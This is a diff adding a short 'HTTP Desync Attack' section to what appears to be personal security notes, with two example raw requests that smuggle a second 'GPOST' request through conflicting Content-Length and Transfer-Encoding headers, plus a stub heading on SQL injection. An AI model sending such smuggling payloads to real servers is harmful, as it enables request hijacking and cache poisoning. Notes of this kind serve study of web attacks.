@@ -1,6 +1,28 @@
 Security Attacks
 -
 
+#### HTTP Desync Attack
+
+````sh
+POST / HTTP/1.1
+Host: example.com
+Content-Length: 6
+Content-Length: 5
+12345GPOST / HTTP/1.1
+Host: example.com
+...
+````
+
+````sh
+POST / HTTP/1.1
+Host: example.com
+Content-Length: 6
+Transfer-Encoding: chunked
+0
+GPOST / HTTP/1.1
+...
+````
+
 #### A1 Injection
 
 SQL Injection and whatnot.
